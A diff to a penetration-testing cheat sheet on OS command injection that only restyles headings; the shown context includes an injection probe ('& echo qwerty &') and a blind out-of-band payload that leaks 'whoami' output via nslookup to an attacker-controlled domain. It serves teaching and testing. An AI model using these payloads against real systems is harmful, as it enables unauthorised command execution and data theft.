@@ -1,6 +1,6 @@
 # OS command injection
 
-### Command injection
+### <mark style="color:yellow;">Command injection</mark>
 
 ```sh
 & echo qwerty &
@@ -8,7 +8,7 @@
 
 Placing `&` after the injected command is generally useful because it separates the injected command from whatever follows the injection point
 
-### Blind OS command
+### <mark style="color:yellow;">Blind OS command</mark>
 
 **Detection**
 
@@ -33,12 +33,12 @@ curl https://website.com/whoami.txt
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
 ```
 
-### Bypass restriction
+### <mark style="color:yellow;">Bypass restriction</mark>
 
 * There are so many ways ...
   * https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions
 
-### Metacharacters
+### <mark style="color:yellow;">Metacharacters</mark>
 
 ```sh
 # Windows & Unix
